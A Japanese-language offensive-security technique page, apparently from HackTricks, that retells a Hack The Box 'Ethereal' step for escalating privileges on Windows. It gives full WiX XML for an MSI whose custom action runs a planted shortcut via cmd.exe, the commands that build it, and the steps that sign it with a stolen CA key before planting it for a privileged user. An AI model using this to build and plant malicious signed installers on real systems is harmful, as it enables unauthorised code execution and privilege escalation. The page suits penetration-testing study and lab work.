# WiXでカスタムアクションMSIを作成する

{{#include ../../banners/hacktricks-training.md}}

この歴史的なHack The Box chainでは、WiX Toolset v3を使用して、事前に配置された`.lnk`ファイルを起動するMSIを作成していました。**MSIは自動的に特権を持つわけではありません**。実行は、Windows Installerのポリシー、custom-actionの属性、およびインストールを実行するユーザーによって決まるコンテキストで行われます。引用されたシナリオでは、攻撃者はtrusted signing CAも盗み、署名済みMSIを別のユーザーが監視しているフォルダーに配置していました。<sup>[[1]](#references)[[3]](#references)</sup>

WiX MSIの使用例を包括的に理解するには、[このページ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)を参照することをお勧めします。ここでは、WiX MSIの使用方法を示すさまざまな例を確認できます。<sup>[[2]](#references)</sup>

このMSIは`C:\Users\Public\Desktop\Shortcuts\rick.lnk`を実行します。元のWiX v3 XMLを以下に保持しています。<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` は最小 Windows Installer バージョンを宣言し、`Compressed="yes"` はパッケージが圧縮されていることを示します。`Stage1` は deferred ですが、`Impersonate="yes"` が設定されているため、インストールを実行するユーザーの impersonated token で実行されます。このシナリオで権限が変更されたのは、後から MSI を開いた privileged user によるものであり、この属性が魔法のように SYSTEM 権限を付与したわけではありません。<sup>[[3]](#references)</sup>

ソースを `candle.exe` で WiX object にコンパイルします。<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
`light.exe` を使用して、そのオブジェクトを MSI にリンクします:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### 元のチェーンで使用された署名手順

対象のワークフローでは、侵害された内部 CA によって署名されたパッケージが受け入れられていました。記事では、回収された `MyCA.cer`/`MyCA.pvk` から署名証明書を作成し、PFX を作成して MSI に署名しました。<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
攻撃者はその後、署名済みパッケージを `D:\DEV\MSIs` に配置し、特権ワークフローまたはユーザーが実行するのを待ちました。この technique を適用する際は、その前提条件を維持してください。昇格されたインストール経路、`AlwaysInstallElevated` のような安全でないポリシー、または特権ユーザーによる実行がなければ、このパッケージは現在のユーザーの権限でのみ実行されます。

## References

- [1] [Hack The Box - Ethereal: 悪意のある msi を作成して root を取得する - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [簡単な入門: WiX で MSI installer を作成する - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
